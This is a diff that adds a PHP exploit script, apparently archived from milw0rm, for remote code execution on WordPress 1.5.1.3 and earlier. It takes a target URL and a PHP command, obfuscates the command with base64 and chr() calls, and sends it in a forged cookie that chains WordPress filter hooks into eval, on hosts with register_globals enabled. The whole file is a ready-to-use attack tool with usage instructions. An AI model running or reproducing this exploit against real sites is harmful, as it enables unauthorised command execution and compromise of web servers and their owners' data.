@@ -1,0 +1,65 @@
+<?php
+    echo "Wordpress <= 1.5.1.3 - remote code execution 0-DDAAYY exploit\n";
+    echo "(C) Copyright 2005 Kartoffelguru\n\n";
+    echo "[!] info: requires register_globals turned on on target host\n\n";
+    if (!extension_loaded('curl')) {
+        die ("[-] you need the curl extension activated...\n");
+    }
+
+    function usage()
+    {
+        die ("usage:\n\t./wpx.php -h http://www.xyz.net/blog/ -c 'system(\"uname -a;id\");'\n\n");
+    }
+
+    $options = getopt("h:c:");
+    if (count($options) < 1 || !isset($options['h'])) {
+        usage();
+    }
+
+    $host = (is_array($options['h']) ? $options['h'][0]:$options['h']);
+    $cmd  = (is_array($options['c']) ? $options['c'][0]:$options['c']);
+
+    if (!preg_match("/^http:\/\//", $host, $dummy)) {
+        usage();
+    }
+
+    if (strlen(trim($cmd))==0) {
+        $cmd = 'phpinfo();';
+    }
+
+    $code = base64_encode($cmd);
+    $cnv = "";
+    for ($i=0;$i<strlen($code); $i++) {
+        $cnv.= "chr(".ord($code[$i]).").";
+    }
+    $cnv.="chr(32)";
+
+    $str = base64_encode('args[0]=eval(base64_decode('.$cnv.')).die()&args[1]=x');
+
+    $cookie='wp_filter[query_vars][0][0][function]=get_lastpostdate;wp_filter[query_vars][0][0][accepted_args]=0;';
+    $cookie.='wp_filter[query_vars][0][1][function]=base64_decode;wp_filter[query_vars][0][1][accepted_args]=1;';
+    $cookie.='cache_lastpostmodified[server]=//e;cache_lastpostdate[server]=';
+    $cookie.=$str;
+    $cookie.=';wp_filter[query_vars][1][0][function]=parse_str;wp_filter[query_vars][1][0][accepted_args]=1;';
+    $cookie.='wp_filter[query_vars][2][0][function]=get_lastpostmodified;wp_filter[query_vars][2][0][accepted_args]=0;';
+    $cookie.='wp_filter[query_vars][3][0][function]=preg_replace;wp_filter[query_vars][3][0][accepted_args]=3;';
+
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $host);
+    curl_setopt($ch, CURLOPT_POST, 0);
+    curl_setopt($ch, CURLOPT_COOKIE, $cookie);
+    curl_setopt($ch, CURLOPT_HEADER, 0);
+    curl_setopt($ch, CURLOPT_CURLOPT_REFERER, $host);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)");
+    curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_0);
+    echo "[+] now executing\n\n";
+
+    $r = curl_exec($ch);
+    curl_close($ch);
+
+    echo $r;
+
+?>
+
+// milw0rm.com [2005-08-09]
